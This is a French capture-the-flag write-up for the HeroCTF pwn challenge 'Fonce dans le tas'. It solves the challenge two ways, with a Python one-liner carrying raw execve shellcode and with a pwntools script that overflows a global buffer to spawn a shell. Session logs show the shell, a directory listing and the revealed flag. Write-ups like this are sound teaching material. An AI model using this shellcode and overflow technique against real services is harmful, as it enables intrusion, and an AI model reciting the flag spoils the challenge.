# Fonce dans le tas

### Catégorie
Pwn

### Description
L'organisateur vous troll encore... Soutirez-lui cet ultime flag en allant plus en profondeur que d'habitude.

nc challs.heroctf.fr 7002
Format : Hero{flag}

### Auteur
SoEasY

### Fichiers
Binaire exécuté par le service : BOO_3

### Solution
// TODO

Encore une fois il y a deux écoles :
- La tem "one liner"
```bash
$ python2.7 -c "print('A'*16 + '\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80' + 'A'*463 + '\x50\xc0\x04\x08')" > payload2
$ cat payload2 - | nc challs.heroctf.fr 7002
---------- EN DEVELOPPEMENT ----------
Quel est ton nom ?
Voici ton nombre aléatoire jeune AAAAAAAAAAAAAAAAj
                                                  X�Rfh-p��Rjhh/bash/bin��RQS��̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP�
 : 42
#TODO : renvoyer un nombre vraiment aléatoire...
ls -al
total 32
drwxr-xr-x 1 pwnflag pwnflag  4096 Nov 13 19:11 .
drwxr-xr-x 1 root    root     4096 Nov 14 20:38 ..
-rwsr-xr-x 1 pwnflag pwnflag 16116 Nov 13 19:11 chall
-rwsr-xr-x 1 root    root      116 Nov 13 16:05 entry.sh
-rw-r--r-- 1 root    root       29 Nov 13 16:05 flag.txt
cat flag.txt
Hero{Sh3lLc0d1ng_m4st3rzzzz}
```

- La team "pwntools"
```python
#!/usr/bin/python
from pwn import *

elf = ELF('./BOO_3')
r = remote('challs.heroctf.fr', 7002)

hackername = elf.sym['hackername']
log.success("BUFFER ADRESS : "+hex(hackername))
atexit = elf.sym['_atexit']
log.success("_atexit ADRESS : "+hex(atexit))
buff_size = atexit - hackername
log.success("BUFFER SIZE : "+str(buff_size))

log.success("Preparing payload")
pld = asm(shellcraft.sh()) # shellcode to spawn /bin/sh
pld += "A"*(buff_size - len(pld))
pld += p32(hackername)

log.success("Enjoy your shell :)")
r.sendline(pld)
r.interactive()
```
Exécution : 
```bash
$ python exploit_boo3.py
[*] '/root/Bureau/BOO_3'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Opening connection to challs.heroctf.fr on port 7002: Done
[+] BUFFER ADRESS : 0x804c040
[+] _atexit ADRESS : 0x804c240
[+] BUFFER SIZE : 512
[+] Preparing payload
[+] Enjoy your shell :)
[*] Switching to interactive mode
---------- EN DEVELOPPEMENT ----------
Quel est ton nom ?
Voici ton nombre aléatoire jeune jhh///sh/bin\x89�h\x814$ri1�Qj\x04�Q��1�j\x0b̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@
 : 42
#TODO : renvoyer un nombre vraiment aléatoire...
$ ls -al
total 32
drwxr-xr-x 1 pwnflag pwnflag  4096 Nov 13 19:11 .
drwxr-xr-x 1 root    root     4096 Nov 14 20:38 ..
-rwsr-xr-x 1 pwnflag pwnflag 16116 Nov 13 19:11 chall
-rwsr-xr-x 1 root    root      116 Nov 13 16:05 entry.sh
-rw-r--r-- 1 root    root       29 Nov 13 16:05 flag.txt
$ cat flag.txt
Hero{Sh3lLc0d1ng_m4st3rzzzz}
$ 
[*] Interrupted
[*] Closed connection to challs.heroctf.fr port 7002
```

### Flag
Hero{Sh3lLc0d1ng_m4st3rzzzz}
